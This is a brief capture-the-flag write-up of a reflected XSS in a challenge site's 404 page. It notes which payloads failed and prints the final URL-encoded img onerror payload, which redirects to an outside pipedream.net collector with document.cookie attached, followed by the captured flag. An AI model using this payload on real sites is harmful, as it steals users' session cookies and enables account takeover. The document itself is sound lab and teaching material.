The 404 page for the site took the url and put it pon the page so you can perform XSS using that

* Using script tags causes the app to hang
* Using img with onerror=fetch loads but the background driver doesnt run it

Final solution was to use onerror=location.replace
```
http://127.0.0.1:1337/%3Cimg%20src%3D1%20onerror%3Dlocation%2Ereplace%28%22https%3A%2F%2Fen8bp1gmewv3v01%2Em%2Epipedream%2Enet%3F%22%2Bdocument%2Ecookie%29%3E
```

CHTB{th1s_1s_my_bug_r3p0rt}
